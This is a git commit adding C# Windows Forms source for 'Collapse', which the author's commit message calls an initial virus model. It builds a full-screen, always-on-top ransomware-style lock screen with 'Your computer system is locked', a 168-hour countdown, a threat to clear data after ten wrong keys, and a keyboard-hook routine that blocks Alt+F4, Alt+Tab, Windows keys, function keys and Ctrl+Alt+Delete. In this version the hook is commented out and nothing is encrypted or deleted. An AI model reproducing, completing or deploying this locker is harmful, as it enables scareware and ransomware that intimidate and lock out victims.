d6c3f7bde50da43057ffe87e3f52ed73e52b9096
张磊 <codelei@163.com>
2020-04-27 11:33:54 +0800

    病毒初始模型，部分功能未完善。此版本仅有屏蔽部分功能键的功能。

---
+++ Collapse/Collapse/FormMain.Designer.cs
@@ -0,0 +1,266 @@
+﻿namespace Collapse
+{
+    partial class collapse
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(collapse));
+            this.labelTitleEN = new System.Windows.Forms.Label();
+            this.labelTitleCH = new System.Windows.Forms.Label();
+            this.richTextBoxTip = new System.Windows.Forms.RichTextBox();
+            this.labelVerifyIDTip = new System.Windows.Forms.Label();
+            this.textBoxPwd = new System.Windows.Forms.TextBox();
+            this.labelLockID = new System.Windows.Forms.Label();
+            this.buttonOK = new System.Windows.Forms.Button();
+            this.labelTip = new System.Windows.Forms.Label();
+            this.textBoxVerifyID = new System.Windows.Forms.TextBox();
+            this.labelRecoverableTimeTip = new System.Windows.Forms.Label();
+            this.labelRecoverableTime = new System.Windows.Forms.Label();
+            this.LockTimer = new System.Windows.Forms.Timer(this.components);
+            this.Checktimer = new System.Windows.Forms.Timer(this.components);
+            this.ExitTimer = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // labelTitleEN
+            // 
+            this.labelTitleEN.BackColor = System.Drawing.Color.Black;
+            this.labelTitleEN.Dock = System.Windows.Forms.DockStyle.Top;
+            this.labelTitleEN.Font = new System.Drawing.Font("宋体", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelTitleEN.ForeColor = System.Drawing.Color.Red;
+            this.labelTitleEN.Location = new System.Drawing.Point(0, 0);
+            this.labelTitleEN.Name = "labelTitleEN";
+            this.labelTitleEN.Size = new System.Drawing.Size(1200, 63);
+            this.labelTitleEN.TabIndex = 0;
+            this.labelTitleEN.Text = "Your computer system is locked";
+            this.labelTitleEN.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // labelTitleCH
+            // 
+            this.labelTitleCH.BackColor = System.Drawing.Color.Black;
+            this.labelTitleCH.Dock = System.Windows.Forms.DockStyle.Top;
+            this.labelTitleCH.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelTitleCH.ForeColor = System.Drawing.Color.Red;
+            this.labelTitleCH.Location = new System.Drawing.Point(0, 63);
+            this.labelTitleCH.Name = "labelTitleCH";
+            this.labelTitleCH.Size = new System.Drawing.Size(1200, 63);
+            this.labelTitleCH.TabIndex = 1;
+            this.labelTitleCH.Text = "您的电脑系统已被锁定";
+            this.labelTitleCH.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // richTextBoxTip
+            // 
+            this.richTextBoxTip.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.richTextBoxTip.BackColor = System.Drawing.Color.Black;
+            this.richTextBoxTip.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.richTextBoxTip.Cursor = System.Windows.Forms.Cursors.No;
+            this.richTextBoxTip.Font = new System.Drawing.Font("宋体", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.richTextBoxTip.ForeColor = System.Drawing.Color.Red;
+            this.richTextBoxTip.ImeMode = System.Windows.Forms.ImeMode.Off;
+            this.richTextBoxTip.Location = new System.Drawing.Point(12, 129);
+            this.richTextBoxTip.Name = "richTextBoxTip";
+            this.richTextBoxTip.ReadOnly = true;
+            this.richTextBoxTip.Size = new System.Drawing.Size(1176, 383);
+            this.richTextBoxTip.TabIndex = 2;
+            this.richTextBoxTip.Text = resources.GetString("richTextBoxTip.Text");
+            // 
+            // labelVerifyIDTip
+            // 
+            this.labelVerifyIDTip.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelVerifyIDTip.BackColor = System.Drawing.Color.Black;
+            this.labelVerifyIDTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelVerifyIDTip.ForeColor = System.Drawing.Color.Red;
+            this.labelVerifyIDTip.Location = new System.Drawing.Point(7, 593);
+            this.labelVerifyIDTip.Name = "labelVerifyIDTip";
+            this.labelVerifyIDTip.Size = new System.Drawing.Size(186, 34);
+            this.labelVerifyIDTip.TabIndex = 3;
+            this.labelVerifyIDTip.Text = "Verify ID：";
+            this.labelVerifyIDTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // textBoxPwd
+            // 
+            this.textBoxPwd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
+            this.textBoxPwd.BackColor = System.Drawing.SystemColors.Desktop;
+            this.textBoxPwd.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.textBoxPwd.ForeColor = System.Drawing.Color.White;
+            this.textBoxPwd.Location = new System.Drawing.Point(163, 655);
+            this.textBoxPwd.Name = "textBoxPwd";
+            this.textBoxPwd.Size = new System.Drawing.Size(928, 41);
+            this.textBoxPwd.TabIndex = 1;
+            // 
+            // labelLockID
+            // 
+            this.labelLockID.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelLockID.BackColor = System.Drawing.Color.Black;
+            this.labelLockID.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelLockID.ForeColor = System.Drawing.Color.Red;
+            this.labelLockID.Location = new System.Drawing.Point(1, 655);
+            this.labelLockID.Name = "labelLockID";
+            this.labelLockID.Size = new System.Drawing.Size(156, 41);
+            this.labelLockID.TabIndex = 5;
+            this.labelLockID.Text = "LockedID:";
+            this.labelLockID.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // buttonOK
+            // 
+            this.buttonOK.Anchor = System.Windows.Forms.AnchorStyles.Right;
+            this.buttonOK.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.buttonOK.Font = new System.Drawing.Font("宋体", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.buttonOK.Location = new System.Drawing.Point(1097, 655);
+            this.buttonOK.Name = "buttonOK";
+            this.buttonOK.Size = new System.Drawing.Size(91, 41);
+            this.buttonOK.TabIndex = 2;
+            this.buttonOK.Text = "O K";
+            this.buttonOK.UseVisualStyleBackColor = true;
+            this.buttonOK.Click += new System.EventHandler(this.ButtonOK_Click);
+            // 
+            // labelTip
+            // 
+            this.labelTip.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.labelTip.BackColor = System.Drawing.Color.Black;
+            this.labelTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelTip.ForeColor = System.Drawing.Color.Red;
+            this.labelTip.Location = new System.Drawing.Point(0, 702);
+            this.labelTip.Name = "labelTip";
+            this.labelTip.Size = new System.Drawing.Size(1200, 49);
+            this.labelTip.TabIndex = 6;
+            this.labelTip.Text = "=== 输入适配您电脑的解锁密钥即可解密程序 ===";
+            this.labelTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // textBoxVerifyID
+            // 
+            this.textBoxVerifyID.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
+            this.textBoxVerifyID.BackColor = System.Drawing.SystemColors.Desktop;
+            this.textBoxVerifyID.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBoxVerifyID.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.textBoxVerifyID.ForeColor = System.Drawing.Color.Red;
+            this.textBoxVerifyID.Location = new System.Drawing.Point(199, 593);
+            this.textBoxVerifyID.Name = "textBoxVerifyID";
+            this.textBoxVerifyID.ReadOnly = true;
+            this.textBoxVerifyID.Size = new System.Drawing.Size(989, 34);
+            this.textBoxVerifyID.TabIndex = 8;
+            this.textBoxVerifyID.Text = "XXX";
+            this.textBoxVerifyID.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // labelRecoverableTimeTip
+            // 
+            this.labelRecoverableTimeTip.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelRecoverableTimeTip.BackColor = System.Drawing.Color.Black;
+            this.labelRecoverableTimeTip.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelRecoverableTimeTip.ForeColor = System.Drawing.Color.Red;
+            this.labelRecoverableTimeTip.Location = new System.Drawing.Point(351, 516);
+            this.labelRecoverableTimeTip.Name = "labelRecoverableTimeTip";
+            this.labelRecoverableTimeTip.Size = new System.Drawing.Size(276, 34);
+            this.labelRecoverableTimeTip.TabIndex = 9;
+            this.labelRecoverableTimeTip.Text = "RecoverableTime：";
+            this.labelRecoverableTimeTip.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // labelRecoverableTime
+            // 
+            this.labelRecoverableTime.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
+            this.labelRecoverableTime.BackColor = System.Drawing.Color.Black;
+            this.labelRecoverableTime.Font = new System.Drawing.Font("宋体", 21.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
+            this.labelRecoverableTime.ForeColor = System.Drawing.Color.Red;
+            this.labelRecoverableTime.Location = new System.Drawing.Point(633, 516);
+            this.labelRecoverableTime.Name = "labelRecoverableTime";
+            this.labelRecoverableTime.Size = new System.Drawing.Size(172, 34);
+            this.labelRecoverableTime.TabIndex = 10;
+            this.labelRecoverableTime.Text = "00:00:00";
+            this.labelRecoverableTime.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // LockTimer
+            // 
+            this.LockTimer.Enabled = true;
+            this.LockTimer.Interval = 1000;
+            this.LockTimer.Tick += new System.EventHandler(this.LockTimer_Tick);
+            // 
+            // Checktimer
+            // 
+            this.Checktimer.Interval = 500;
+            this.Checktimer.Tick += new System.EventHandler(this.Checktimer_Tick);
+            // 
+            // ExitTimer
+            // 
+            this.ExitTimer.Interval = 3000;
+            this.ExitTimer.Tick += new System.EventHandler(this.ExitTimer_Tick);
+            // 
+            // collapse
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
+            this.AutoSize = true;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(1200, 760);
+            this.Controls.Add(this.labelRecoverableTime);
+            this.Controls.Add(this.labelRecoverableTimeTip);
+            this.Controls.Add(this.textBoxVerifyID);
+            this.Controls.Add(this.labelTip);
+            this.Controls.Add(this.buttonOK);
+            this.Controls.Add(this.labelLockID);
+            this.Controls.Add(this.textBoxPwd);
+            this.Controls.Add(this.labelVerifyIDTip);
+            this.Controls.Add(this.richTextBoxTip);
+            this.Controls.Add(this.labelTitleCH);
+            this.Controls.Add(this.labelTitleEN);
+            this.Cursor = System.Windows.Forms.Cursors.No;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "collapse";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Collapse ---- v1.0";
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.Load += new System.EventHandler(this.Collapse_Load);
+            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Collapse_KeyDown);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label labelTitleEN;
+        private System.Windows.Forms.Label labelTitleCH;
+        private System.Windows.Forms.RichTextBox richTextBoxTip;
+        private System.Windows.Forms.Label labelVerifyIDTip;
+        private System.Windows.Forms.TextBox textBoxPwd;
+        private System.Windows.Forms.Label labelLockID;
+        private System.Windows.Forms.Button buttonOK;
+        private System.Windows.Forms.Label labelTip;
+        private System.Windows.Forms.TextBox textBoxVerifyID;
+        private System.Windows.Forms.Label labelRecoverableTimeTip;
+        private System.Windows.Forms.Label labelRecoverableTime;
+        private System.Windows.Forms.Timer LockTimer;
+        private System.Windows.Forms.Timer Checktimer;
+        private System.Windows.Forms.Timer ExitTimer;
+    }
+}
+
---
+++ Collapse/Collapse/FormMain.cs
@@ -0,0 +1,193 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Vjsdn.Tech.KeyboardHook;
+
+namespace Collapse
+{
+    public partial class collapse : Form
+    {
+        //勾子管理类 
+        private KeyboardHookLib _keyboardHook = null;
+
+        //本机验证ID
+        private string VerifyID = null;
+        //可随机字符
+        private char[] constant =
+        {
+            '0','1','2','3','4','5','6','7','8','9',
+            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
+            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
+         };
+        //计时用变量
+        int time = 168;       //时
+        int branch = 60;     //分
+        int second = 60;     //秒
+
+        //错误次数统计
+        int errorCount = 10;
+
+        //错误提示计时器时长
+        int errorTime = 5;
+
+        public collapse()
+        {
+            InitializeComponent();
+        }
+
+        private void Collapse_Load(object sender, EventArgs e)
+        {
+            this.FormBorderStyle = FormBorderStyle.None;
+
+            //安装勾子 
+            //_keyboardHook = new KeyboardHookLib();
+            //_keyboardHook.InstallHook(this.OnKeyPress);
+
+            //初始化本机验证ID
+            Random rd = new Random();
+            StringBuilder sb = new StringBuilder();
+            for (int i=1;i<=60;i++)
+            {
+                sb.Append(constant[rd.Next(62)]);
+            }
+            VerifyID = sb.ToString();
+            textBoxVerifyID.Text = VerifyID;
+        }
+
+        /// <summary> 
+        /// 客户端键盘捕捉事件. 
+        /// </summary> 
+        /// <param name="hookStruct">由Hook程序发送的按键信息</param> 
+        /// <param name="handle">是否拦截</param> 
+        public void OnKeyPress(KeyboardHookLib.HookStruct hookStruct, out bool handle)
+        {
+            handle = false; //预设不拦截任何键 
+            // 截获左win(开始菜单键)
+            if (hookStruct.vkCode == 91)
+            {
+                handle = true;
+            }
+            // 截获右win
+            if (hookStruct.vkCode == 92)
+            {
+                handle = true;
+            }
+            //截获Ctrl+Esc 
+            if (hookStruct.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Control)
+            {
+                handle = true;
+            }
+            //截获alt+f4 
+            if (hookStruct.vkCode == (int)Keys.F4 && (int)Control.ModifierKeys == (int)Keys.Alt)
+            {
+                handle = true;
+            }
+            //截获alt+tab 
+            if (hookStruct.vkCode == (int)Keys.Tab && (int)Control.ModifierKeys == (int)Keys.Alt)
+            {
+                handle = true;
+            }
+            //截获F1-F12
+            if (hookStruct.vkCode >= (int)Keys.F1 && hookStruct.vkCode <= (int)Keys.F12)
+            {
+                handle = true;
+            }
+            //截获Ctrl+Alt+Delete 
+            if ((int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt + (int)Keys.Delete)
+            {
+                handle = true;
+            }
+            //如果键A~Z 
+            //if (hookStruct.vkCode >= (int)Keys.A && hookStruct.vkCode <= (int)Keys.Z)
+            //{
+            //    //挡掉B键 
+            //    if (hookStruct.vkCode == (int)Keys.B)
+            //        hookStruct.vkCode = (int)Keys.None; //设键为0 
+
+            //    handle = true;
+            //}
+            //Keys key = (Keys)hookStruct.vkCode;
+            //label1.Text = "你按下:" + (key == Keys.None ? "" : key.ToString());
+        }
+
+        private void Collapse_KeyDown(object sender, KeyEventArgs e)
+        {
+            ButtonOK_Click(null,null);
+        }
+
+        private void ButtonOK_Click(object sender, EventArgs e)
+        {
+            if (textBoxPwd.Text.Equals(VerifyID))
+            {
+                labelTip.Text = "电脑成功解锁!! 恭喜您的电脑脱落了危险!!";
+                ExitTimer.Start();
+            }
+            else if(textBoxPwd.Text.Equals("lockkey"))
+            {
+                //取消勾子 
+                if (_keyboardHook != null) _keyboardHook.UninstallHook();
+                labelTip.Text = "您解锁了键盘钩子,现在,您可以使用全部键盘按键了!!";
+            }
+            else
+            {
+                errorCount--;
+                Checktimer.Start();
+            }
+        }
+
+        private void LockTimer_Tick(object sender, EventArgs e)
+        {
+            //初始化计时事件
+            if (second == 0)
+            {
+                branch--;
+                second = 60;
+            }
+            else if (branch == 0)
+            {
+                time--;
+                branch = 60;
+                second = 60;
+            }
+            second--;
+            this.labelRecoverableTime.Text = $"{time}:{branch}:{second}";
+        }
+
+        private void Checktimer_Tick(object sender, EventArgs e)
+        {
+            if (errorTime == 0)
+            {
+                errorTime = 5;
+                labelTip.Text = "=== 输入适配您电脑的解锁密钥即可关闭本程序 ===";
+                Checktimer.Stop();
+            }
+            else
+            {
+                errorTime--;
+                if (errorCount <= 0)
+                {
+                    labelTip.Text = "错误次数已达上限!! 执行病毒解密&清空数据操作...";
+                    Checktimer.Stop();
+                    ExitTimer.Start();
+                }
+                else
+                {
+                    labelTip.Text = "密钥输入错误!! 请检查后重新输入...(还有" + errorCount + "次机会)";
+                }
+            }
+        }
+
+        private void ExitTimer_Tick(object sender, EventArgs e)
+        {
+            //取消勾子 
+            if (_keyboardHook != null) _keyboardHook.UninstallHook();
+            Application.Exit();
+        }
+    }
+}
